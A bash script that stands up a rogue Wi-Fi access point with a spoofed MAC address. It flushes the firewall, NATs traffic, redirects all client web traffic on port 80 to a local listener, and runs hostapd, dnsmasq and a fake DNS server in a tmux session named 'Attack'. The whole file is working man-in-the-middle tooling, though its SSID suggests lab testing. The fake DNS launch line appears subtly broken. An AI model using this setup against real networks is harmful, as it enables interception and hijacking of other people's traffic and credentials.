#!/bin/bash

lan=wlan0
internet=eth0
ssid="TestNet_DontConnect"
ap_mac="02:ab:cd:ef:12:30"


#prep the interface for wireless operations.
killall wicd
killall NetworkManager
killall nm-applet
killall dhclient
killall wpa_supplicant
killall wpa_cli
killall ifplugd

ifconfig $lan down

#setup IPTables -- no firewall, just NAT
iptables -F
iptables -X
iptables --table nat --flush
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT -i $lan -j ACCEPT
iptables -A OUTPUT -o $lan -j ACCEPT
iptables -A FORWARD -i $internet -o wlan0 -j ACCEPT
iptables -A FORWARD -i $lan -o $internet -j ACCEPT
iptables -A POSTROUTING -t nat -o $internet -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination 10.1.1.1:8080

#AP Configuration
ifconfig $lan down
ifconfig $lan hw ether $ap_mac

# might be having issues with this....
ifconfig $lan 10.1.1.1 netmask 255.255.255.0

cp hostapd.conf /tmp/hostapd.conf
echo "
interface=$lan
ssid=$ssid
bssid=$ap_mac
" >> /tmp/hostapd.conf

tmux start-server
tmux new-session -d -s Attack -n AttackHost
tmux new-window -tAttack:1 -n 'HostAPD' "hostapd -dd /tmp/hostapd.conf"

#DHCP
cp dnsmasq.conf /tmp/dnsmasq_tmp.conf
echo "interface=$lan" >> /tmp/dnsmasq_tmp.conf
killall dnsmasq
tmux new-window -tAttack:2 -n 'DNSMasq' "dnsmasq -p 0 -d -C /tmp/dnsmasq_tmp.conf"

cd fakedns/
tmux new-window -tAttack:3 -n 'FakeDNS' "python3 -c fakedns.py dns.conf.example"
